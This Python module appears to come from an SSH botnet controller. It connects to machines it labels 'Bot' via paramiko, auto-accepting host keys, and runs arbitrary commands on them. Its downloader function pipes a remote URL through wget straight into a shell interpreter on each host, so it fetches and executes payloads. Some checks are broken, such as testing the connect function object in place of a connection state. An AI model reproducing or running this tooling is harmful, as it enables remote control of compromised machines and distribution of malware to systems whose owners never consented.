from modules import db,printer
from time import sleep
import paramiko


ssh=paramiko.SSHClient()
addr=""

def connect(address,port,username,password,pkey):
    try:
        global addr
        addr=printer.color_red(address)
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if (pkey == ''):
            ssh.connect(hostname=address, port=port, username=username,password=password, timeout=10, allow_agent=False,look_for_keys=False)
        else:
            private_key = paramiko.RSAKey.from_private_key_file(pkey)
            ssh.connect(hostname=address, port=port, username=username, pkey=private_key,timeout=10, allow_agent=False,look_for_keys=False)
            status=printer.color_red("Connected to Bot %s"%address)
            printer.print_success(status)
    except paramiko.AuthenticationException:
            status=printer.color_red("Authentication failed")
            printer.print_error(status)
            result_flag = False
    except paramiko.SSHException as sshException:
            printer.print_error("Could not establish SSH connection: %s" % sshException)
            result_flag = False
    except Exception as e:
            printer.print_error("PYTHON3 gives the following error in connecting\n",e)
            result_flag = False
    else:
        result_flag = True
    return result_flag
       
def sendCommand(command):
        if(connect):
            stdin, stdout, stderr = ssh.exec_command(command)
            ssh_error = stderr.readlines()
            if(ssh_error):
                status=printer.color_blue("\tOutput from %s \t    [+]"%addr)
                print("[+]---------------------------------[+]")
                printer.print_success(status)
                print("[+]---------------------------------[+]")
                status=printer.color_red("There was an error running the Command")
                printer.print_error(status)
                printer.print_error('\t'.join(map(str,ssh_error)))
                print("[+]---------------------------------[+]")
            else:
             status=printer.color_blue("\tOutput from %s \t    [+]"%addr)
             print("[+]---------------------------------[+]")
             printer.print_success(status)
             print("[+]---------------------------------[+]\n")
             print('\t'+'\t'.join(map(str,stdout.readlines())))
             print("[+]---------------------------------[+]")
        else:
            error=printer.color_red("Connection not opened.")
            printer.print_error(error)


def downloader(dest,url,execute,interpreter):
    if(connect):
        if(execute == ""):
            execute = "n"
            interpreter ="n"
        if(execute =="n"):
            cmd="wget -P %s %s"%(dest,url)
        if(execute =="y"):
            cmd="wget -q -O - %s | %s"%(url,interpreter)
        if(interpreter == ""):
            interpreter = "sh"
        stdin,stdout,stderr = ssh.exec_command(cmd)
        status=printer.color_blue("\tOutput from %s \t    [+]"%addr)
        print("[+]---------------------------------[+]")
        printer.print_success(status)
        print("[+]---------------------------------[+]")
        print(''.join(map(str,stdout.readlines())))
        print(''.join(map(str,stderr.readlines())))
        print("[+]---------------------------------[+]")
